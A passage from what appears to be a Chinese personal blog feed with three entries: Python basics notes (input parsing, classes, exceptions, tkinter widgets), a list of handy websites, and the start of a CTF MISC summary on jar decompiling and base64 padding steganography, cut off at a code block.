href="https://www.xueyidian.cn/webqd/471.html">https://www.xueyidian.cn/webqd/471.html</a><br>微信公众号：<br><a href="https://blog.csdn.net/qq_28506819/article/details/77827899">https://blog.csdn.net/qq_28506819/article/details/77827899</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python基础用法</title>
      <link href="/2020/02/25/python-basics/"/>
      <url>/2020/02/25/python-basics/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li>单行读入不定个字符串(整数)，储存在列表中<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>,<span class="built_in">input</span>().split()))<span class="comment">#单行读入不定个整数，从0开始存入列表a中</span></span><br></pre></td></tr></table></figure></li><li>先输入数字n,再输入n行数，每行一个数<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">a=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">或者</span><br><span class="line">n=<span class="built_in">int</span>(<span class="built_in">input</span>()）</span><br><span class="line">a=[<span class="built_in">int</span>(<span class="built_in">input</span>()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))]</span><br></pre></td></tr></table></figure></li><li>先输入数字n,再输入n行数，每行三个数，储存在三个列表中,用空格分隔<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">x=[] y=[] z=[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">a,b,c=<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())</span><br><span class="line">x.append(a)</span><br><span class="line">y.append(b)</span><br><span class="line">z.append(c)</span><br></pre></td></tr></table></figure></li></ul><p>创建类的对象：<br>对象名 = 类名()</p><p>访问类中的变量和方法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象名.类中的变量名 </span><br><span class="line">对象名.方法名([参数])</span><br></pre></td></tr></table></figure><p>类的所有方法都必须至少有一个名为self的参数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,...</span>):</span> <span class="comment">#构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span>   <span class="comment">#析构方法</span></span><br></pre></td></tr></table></figure><h3 id="类中定义的变量"><a href="#类中定义的变量" class="headerlink" title="类中定义的变量:"></a>类中定义的变量:</h3><h4 id="实例成员（实例属性）"><a href="#实例成员（实例属性）" class="headerlink" title="实例成员（实例属性）"></a>实例成员（实例属性）</h4><pre><code> 指在构造函数__init__()中定义的，定义和使用时必须以self作为前缀；</code></pre><h4 id="类成员（类属性）"><a href="#类成员（类属性）" class="headerlink" title="类成员（类属性）"></a>类成员（类属性）</h4><pre><code> 类成员是在类中所有方法之外定义的数据成员。</code></pre><p>在主程序中（或类的外部），实例成员属于实例（即对象），只能通过对象名访问；而类 成员属于类，可以通过类名或对象名访问。<br>在类的方法中可以调用类本身的其他方法，也可以访问类成员以及实例成员。</p><ul><li><p>实例方法<br>  定义：第一个参数必须是实例对象，该参数名一般约定为“self”，通过它来传递实例的属性和方法（也可以传类的属性和方法）；<br>  调用：只能由实例对象调用。</p></li><li><p>类方法<br>  定义：使用装饰器@classmethod。第一个参数必须是当前类对象，该参数名一般约定为“cls”，通过它来传递类的属性和方法（不能传实例的属性和方法）；<br>  调用：类对象或实例对象都可以调用。</p></li><li><p>静态方法<br>  定义：使用装饰器@staticmethod。参数随意，没有“self”和“cls”参数，但是方法体中不能使用类或实例的任何属性和方法；</p></li></ul><p>在继承关系中，已有的、设计好的类称为父类 或基类，新设计的类称为子类或派生类。<br>    调用：类对象或实例对象都可以调用。<br>调用父类的方法，可以使用内置函数super()或通过“父类名.方法名()”的方 式来实现。<br>方法是特殊的函数。</p><hr><p>Python中的一切对象都可以称为对象，除了数字、字符串、列表、元组、字典、集合、range对象、zip对象等等，函数也是对象，类也是对象。<br>在主程序中（或类的外部），实例属性属于实例（对象），只能通过对象名访问；<br>而类属性属于类，可以通过类名或对象名访问。</p><p>1.基本类的定义</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名：</span></span><br><span class="line"><span class="class">    <span class="title">def</span> 方法1(<span class="params">self,参数列表）：</span></span></span><br><span class="line"><span class="params"><span class="class">        <span class="keyword">pass</span></span></span></span><br><span class="line"><span class="params"><span class="class">    <span class="keyword">def</span> 方法<span class="number">2</span>(<span class="params">self,参数列表）：</span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="class">        <span class="keyword">pass</span></span></span></span></span><br></pre></td></tr></table></figure><p>2.当一个类定义完成之后，要使用这个类来创建对象</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建对象</span></span><br><span class="line">对象变量 = 类名（）</span><br><span class="line">对象变量.方法<span class="number">1</span>（）</span><br><span class="line">对象变量.方法<span class="number">2</span>（）</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="comment">#定义基本属性</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span>  <span class="comment">#类成员</span></span><br><span class="line">    age = <span class="number">0</span>    <span class="comment">#类成员</span></span><br><span class="line">    <span class="comment">#定义私有属性,私有属性在类外部无法直接进行访问</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,n,a,w</span>):</span></span><br><span class="line">        self.name = n  <span class="comment">#实例成员</span></span><br><span class="line">        self.age = a    <span class="comment">#实例成员</span></span><br><span class="line">        self.__weight = w</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span>(<span class="params">self</span>):</span>   <span class="comment">#实例方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁了&quot;</span> %(self.name,self.age))</span><br><span class="line"> </span><br><span class="line">p = people(<span class="string">&#x27;jack&#x27;</span>,<span class="number">10</span>,<span class="number">120</span>) <span class="comment"># 实例化类</span></span><br><span class="line">p.speak()  <span class="comment">#调用speak方法</span></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line">jack 说: 我 <span class="number">10</span> 岁了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,sound</span>):</span>  <span class="comment">#构造方法第一个参数必须为 self</span></span><br><span class="line">        self.name = name    <span class="comment">#构造该类的属性（实例成员）</span></span><br><span class="line">        self.sound = sound</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_sound</span>(<span class="params">self</span>):</span>  <span class="comment">#实例方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;发出了&quot;&#123;1: ^4&#125;&quot;的声音。&#x27;</span>.<span class="built_in">format</span>(self.name,self.sound))</span><br><span class="line"></span><br><span class="line">cat = Animal(<span class="string">&#x27;小花&#x27;</span>,<span class="string">&#x27;喵喵&#x27;</span>) <span class="comment">#实例类Animal的一个对象cat，自动调用__init__()方法</span></span><br><span class="line">cat.print_sound()   <span class="comment">#cat调用自己的方法</span></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">小花发出了<span class="string">&quot; 喵喵 &quot;</span>的声音。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="类的专有方法"><a href="#类的专有方法" class="headerlink" title="类的专有方法"></a>类的专有方法</h3><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td><strong>init</strong> :</td><td>构造函数，在生成对象时调用</td></tr><tr><td><strong>del</strong> :</td><td>析构函数，释放对象时使用</td></tr><tr><td><strong>repr</strong> :</td><td>打印，转换</td></tr><tr><td><strong>setitem</strong> :</td><td>按照索引赋值</td></tr><tr><td><strong>getitem</strong>:</td><td>按照索引获取值</td></tr><tr><td><strong>len</strong>:</td><td>获得长度</td></tr><tr><td><strong>cmp</strong>:</td><td>比较运算</td></tr><tr><td><strong>call</strong>:</td><td>函数调用</td></tr><tr><td><strong>add</strong>:</td><td>加运算</td></tr><tr><td><strong>sub</strong>:</td><td>减运算</td></tr><tr><td><strong>mul</strong>:</td><td>乘运算</td></tr><tr><td><strong>truediv</strong>:</td><td>除运算</td></tr><tr><td><strong>mod</strong>:</td><td>求余运算</td></tr><tr><td><strong>pow</strong>:</td><td>乘方</td></tr></tbody></table><hr><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>BaseException   所有异常的基类<br>SystemExit  解释器请求退出<br>KeyboardInterrupt   用户中断执行(通常是输入^C)<br>Exception   常规错误的基类<br>StopIteration   迭代器没有更多的值<br>GeneratorExit   生成器(generator)发生异常来通知退出<br>SystemExit  Python 解释器请求退出<br>StandardError   所有的内建标准异常的基类<br>ArithmeticError 所有数值计算错误的基类<br>FloatingPointError  浮点计算错误<br>OverflowError   数值运算超出最大限制<br>ZeroDivisionError   除(或取模)零 (所有数据类型)<br>AssertionError  断言语句失败<br>AttributeError  对象没有这个属性<br>EOFError    没有内建输入,到达EOF 标记<br>EnvironmentError    操作系统错误的基类<br>IOError 输入/输出操作失败<br>OSError 操作系统错误<br>WindowsError    系统调用失败<br>ImportError 导入模块/对象失败<br>KeyboardInterrupt   用户中断执行(通常是输入^C)<br>LookupError 无效数据查询的基类<br>IndexError  序列中没有没有此索引(index)<br>KeyError    映射中没有这个键<br>MemoryError 内存溢出错误(对于Python 解释器不是致命的)<br>NameError   未声明/初始化对象 (没有属性)<br>UnboundLocalError   访问未初始化的本地变量<br>ReferenceError  弱引用(Weak reference)试图访问已经垃圾回收了的对象<br>RuntimeError    一般的运行时错误<br>NotImplementedError 尚未实现的方法<br>SyntaxError Python 语法错误<br>IndentationError    缩进错误<br>TabError    Tab 和空格混用<br>SystemError 一般的解释器系统错误<br>TypeError   对类型无效的操作<br>ValueError  传入无效的参数<br>UnicodeError    Unicode 相关的错误<br>UnicodeDecodeError  Unicode 解码时的错误<br>UnicodeEncodeError  Unicode 编码时错误<br>UnicodeTranslateError   Unicode 转换时错误<br>Warning 警告的基类<br>DeprecationWarning  关于被弃用的特征的警告<br>FutureWarning   关于构造将来语义会有改变的警告<br>OverflowWarning 旧的关于自动提升为长整型(long)的警告<br>PendingDeprecationWarning   关于特性将会被废弃的警告<br>RuntimeWarning  可疑的运行时行为(runtime behavior)的警告<br>SyntaxWarning   可疑的语法的警告<br>UserWarning 用户代码生成的警告</p><p>关键字 关键字说明<br>try/except  捕获异常并处理<br>pass    忽略异常<br>as  定义异常实例（except MyError as e）<br>else    如果try中的语句没有引发异常，则执行else中的语句<br>finally 无论是否出现异常，都执行的代码<br>raise       抛出/引发异常</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">     &lt;语句&gt;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">except</span> (&lt;异常名<span class="number">1</span>&gt;, &lt;异常名<span class="number">2</span>&gt;, ...):</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;异常说明&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">     &lt;语句&gt;</span><br></pre></td></tr></table></figure><p>区分优先级</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> &lt;异常名<span class="number">1</span>&gt;:</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;异常说明1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">except</span> &lt;异常名<span class="number">2</span>&gt;:</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;异常说明2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">except</span> &lt;异常名<span class="number">3</span>&gt;:</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;异常说明3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>无论是否发生异常都将会执行最后的代码。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">     &lt;语句&gt;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line"> </span><br><span class="line">      &lt;语句&gt;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_zero</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;参数错误&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">not_zero(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h2><p>Button：一个简单的按钮，用来执行一个命令或别的操作。<br>Canvas：组织图形。这个部件可以用来绘制图表和图，创建图形编辑器，实现定制窗口部件。<br>Checkbutton：代表一个变量，它有两个不同的值。点击这个按钮将会在这两个值间切换。<br>Entry：文本输入域。<br>Frame：一个容器窗口部件。帧可以有边框和背景，当创建一个应用程序或dialog(对话）版面时，帧被用来组织其它的窗口部件。<br>Label：显示一个文本或图象。<br>Listbox：显示供选方案的一个列表。listbox能够被配置来得到radiobutton或checklist的行为。<br>Menu：菜单条。用来实现下拉和弹出式菜单。<br>Menubutton：菜单按钮。用来实现下拉式菜单。<br>Message：显示一文本。类似label窗口部件，但是能够自动地调整文本到给定的宽度或比率。<br>Radiobutton：代表一个变量，它可以有多个值中的一个。点击它将为这个变量设置值，并且清除与这同一变量相关的其它radiobutton。<br>Scale：允许你通过滑块来设置一数字值。<br>Scrollbar：为配合使用canvas, entry, listbox, and text窗口部件的标准滚动条。<br>Text：格式化文本显示。允许你用不同的样式和属性来显示和编辑文本。同时支持内嵌图象和窗口。<br>Toplevel：一个容器窗口部件，作为一个单独的、最上面的窗口显示。<br>messageBox：消息框，用于显示你应用程序的消息框。(Python2中为tkMessagebox)</p><p>Dimension           控件大小；<br>Color               控件颜色；<br>Font                控件字体；<br>Anchor              锚点；<br>Relief              控件样式；<br>Bitmap              位图；<br>Cursor              光标；</p><hr><h3 id="Label部件"><a href="#Label部件" class="headerlink" title="Label部件"></a>Label部件</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk  <span class="comment"># 使用Tkinter前需要先导入</span></span><br><span class="line"><span class="comment"># 第1步，实例化object，建立窗口window</span></span><br><span class="line">window = tk.Tk()</span><br><span class="line"><span class="comment"># 第2步，给窗口的可视化起名字</span></span><br><span class="line">window.title(<span class="string">&#x27;Window&#x27;</span>)</span><br><span class="line"><span class="comment"># 第3步，设定窗口的大小(长 * 宽)</span></span><br><span class="line">window.geometry(<span class="string">&#x27;500x300&#x27;</span>)  <span class="comment"># 这里的乘是小x</span></span><br><span class="line"><span class="comment"># 第4步，在图形界面上设定标签</span></span><br><span class="line">l = tk.Label(window, text=<span class="string">&#x27;Tkinter&#x27;</span>, bg=<span class="string">&#x27;blue&#x27;</span>, font=(<span class="string">&#x27;Arial&#x27;</span>, <span class="number">12</span>), width=<span class="number">30</span>, height=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 说明： bg为背景，font为字体，width为长，height为高，这里的长和高是字符的长和高，比如height=2,就是标签有2个字符这么高</span></span><br><span class="line"><span class="comment"># 第5步，放置标签</span></span><br><span class="line">l.pack()    <span class="comment"># Label内容content区域放置位置，自动调节尺寸</span></span><br><span class="line"><span class="comment"># 放置lable的方法有：1）l.pack(); 2)l.place();</span></span><br><span class="line"><span class="comment"># 第6步，主窗口循环显示</span></span><br><span class="line">window.mainloop()</span><br></pre></td></tr></table></figure><hr><h3 id="Button（按钮）"><a href="#Button（按钮）" class="headerlink" title="Button（按钮）"></a>Button（按钮）</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#初始化Tk()</span></span><br><span class="line">myWindow = Tk()</span><br><span class="line"><span class="comment">#设置标题</span></span><br><span class="line">myWindow.title(<span class="string">&#x27;Python GUI Learning&#x27;</span>)</span><br><span class="line"><span class="comment">#创建两个按钮</span></span><br><span class="line">b1=Button(myWindow, text=<span class="string">&#x27;button1&#x27;</span>,bg=<span class="string">&quot;green&quot;</span>, relief=<span class="string">&#x27;raised&#x27;</span>, width=<span class="number">8</span>, height=<span class="number">2</span>)</span><br><span class="line">b1.grid(row=<span class="number">0</span>, column=<span class="number">0</span>, sticky=W, padx=<span class="number">25</span>,pady=<span class="number">25</span>)</span><br><span class="line">b2=Button(myWindow, text=<span class="string">&#x27;button2&#x27;</span>, font=(<span class="string">&#x27;Helvetica 10 bold&#x27;</span>),width=<span class="number">8</span>, height=<span class="number">2</span>)</span><br><span class="line">b2.grid(row=<span class="number">0</span>, column=<span class="number">1</span>, sticky=W, padx=<span class="number">25</span>, pady=<span class="number">25</span>)</span><br><span class="line"><span class="comment">#进入消息循环</span></span><br><span class="line">myWindow.mainloop()</span><br></pre></td></tr></table></figure><hr><h3 id="Entry窗口"><a href="#Entry窗口" class="headerlink" title="Entry窗口"></a>Entry窗口</h3><p>登录网页时，用户交互界面需要</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk  <span class="comment"># 使用Tkinter前需要先导入</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 第1步，实例化object，建立窗口window</span></span><br><span class="line">window = tk.Tk()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 第2步，给窗口的可视化起名字</span></span><br><span class="line">window.title(<span class="string">&#x27;Window&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 第3步，设定窗口的大小(长 * 宽)</span></span><br><span class="line">window.geometry(<span class="string">&#x27;500x300&#x27;</span>)  <span class="comment"># 这里的乘是小x</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 第4步，在图形界面上设定输入框控件entry并放置控件</span></span><br><span class="line">e1 = tk.Entry(window, show=<span class="string">&#x27;*&#x27;</span>, font=(<span class="string">&#x27;Arial&#x27;</span>, <span class="number">14</span>))   <span class="comment"># 显示成密文形式</span></span><br><span class="line">e2 = tk.Entry(window, show=<span class="literal">None</span>, font=(<span class="string">&#x27;Arial&#x27;</span>, <span class="number">14</span>))  <span class="comment"># 显示成明文形式</span></span><br><span class="line">e1.pack()</span><br><span class="line">e2.pack()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 第5步，主窗口循环显示</span></span><br><span class="line">window.mainloop()</span><br></pre></td></tr></table></figure><hr><h3 id="文件内容替换"><a href="#文件内容替换" class="headerlink" title="文件内容替换"></a>文件内容替换</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">  content = file.read()</span><br><span class="line">  <span class="built_in">print</span>(file.read())</span><br><span class="line">  file.close()</span><br><span class="line"></span><br><span class="line">t = content.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    f2.write(t)</span><br></pre></td></tr></table></figure><hr><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/61168074">https://zhuanlan.zhihu.com/p/61168074</a><br><a href="https://www.cnblogs.com/shwee/p/9427975.html">https://www.cnblogs.com/shwee/p/9427975.html</a><br><a href="https://zhuanlan.zhihu.com/p/61168074">https://zhuanlan.zhihu.com/p/61168074</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>良心网站</title>
      <link href="/2020/02/15/ClassicWebsite/"/>
      <url>/2020/02/15/ClassicWebsite/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="removebg——删除图像背景"><a href="#removebg——删除图像背景" class="headerlink" title="removebg——删除图像背景"></a>removebg——删除图像背景</h2><p>自动抠图</p><hr><h2 id="zitijia-com——字体下载"><a href="#zitijia-com——字体下载" class="headerlink" title="zitijia.com——字体下载"></a>zitijia.com——字体下载</h2><p>大部分字体免费下载</p><hr><h2 id="pixivison-net——插画网"><a href="#pixivison-net——插画网" class="headerlink" title="pixivison.net——插画网"></a>pixivison.net——插画网</h2><p>各种插画（包括二次元）</p><hr><h2 id="iData——各种论文免费下载"><a href="#iData——各种论文免费下载" class="headerlink" title="iData——各种论文免费下载"></a>iData——各种论文免费下载</h2><hr><h2 id="smallpdf——常用文件格式转换"><a href="#smallpdf——常用文件格式转换" class="headerlink" title="smallpdf——常用文件格式转换"></a>smallpdf——常用文件格式转换</h2><p>如常用的pdf——&gt;word</p><hr><h2 id="web-android-com——手机电脑连接"><a href="#web-android-com——手机电脑连接" class="headerlink" title="web.android.com——手机电脑连接"></a>web.android.com——手机电脑连接</h2><p>可用于直播</p><hr><h2 id="pexels-com——高清图片下载"><a href="#pexels-com——高清图片下载" class="headerlink" title="pexels.com——高清图片下载"></a>pexels.com——高清图片下载</h2><p>包含详细的图片信息</p><hr><h2 id="addog-vip——百宝箱"><a href="#addog-vip——百宝箱" class="headerlink" title="addog.vip——百宝箱"></a>addog.vip——百宝箱</h2><p>涵盖各种网站的连接</p><hr><h2 id="UHD-PIXEL——4k壁纸网站"><a href="#UHD-PIXEL——4k壁纸网站" class="headerlink" title="UHD PIXEL——4k壁纸网站"></a>UHD PIXEL——4k壁纸网站</h2><p>wall.alphacoders.com——壁纸网站</p><hr><h2 id="小白盘"><a href="#小白盘" class="headerlink" title="小白盘"></a><a href="https://www.xiaobaipan.com/">小白盘</a></h2><p>一款纯粹的资源搜索工具，包括小说、影视、音乐、书籍等等，非常全面。</p><hr><h2 id="盘搜搜"><a href="#盘搜搜" class="headerlink" title="盘搜搜"></a><a href="https://www.pansoso.com/">盘搜搜</a></h2><p>也涵盖小说、影视、音乐、书籍等各种内容，而且，提供的链接均是有效链接</p><hr><h2 id="多吉搜索"><a href="#多吉搜索" class="headerlink" title="多吉搜索"></a><a href="https://www.dogedoge.com/">多吉搜索</a></h2><p>不追踪浏览数据，不访问用户隐私。<br>多吉搜索，更加偏重来自于第三方平台的内容，例如，知乎，维基百科、官方网站、GitHub等，结果更加准确公正。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC总结</title>
      <link href="/2020/02/14/Misc/"/>
      <url>/2020/02/14/Misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="jar反编译（jar反编译工具：jd-gui）"><a href="#jar反编译（jar反编译工具：jd-gui）" class="headerlink" title="jar反编译（jar反编译工具：jd-gui）"></a>jar反编译（jar反编译工具：jd-gui）</h2><p><img src="1.png"></p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>base64使用 a-zA-Z0-9+/ 等64个字符来替换掉所有字符，同时使用 = 来替换掉空格,<br>6bit编为1个字符，而1个字节是8bit</p><h5 id="base64可能会出现3种情况："><a href="#base64可能会出现3种情况：" class="headerlink" title="base64可能会出现3种情况："></a>base64可能会出现3种情况：</h5><p><code>1. 刚好能编完（例如3个字节的字符串base64加密后有4个字符）</code><br><code>2.剩余2bit（例如2个字节的字符串base64加密后第3个字符只编码了4bit，此时使用=补充6bit）</code><br><code>3. 剩余4bit（例如1个字节的字符串base64加密后第2个字符只编码了2bit，此时使用==补充12bit），由于第3/2个字符只编码了4/2bit，所以只有前面被编码的bit是有效的，而后面的bit则在正常情况下默认填0，因此可以将想隐写的数据隐藏在后面的bit中，即：1个=可以隐藏2个bit</code></p><p>将这些bit读出来，拼在一起转换为字符串即可获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import 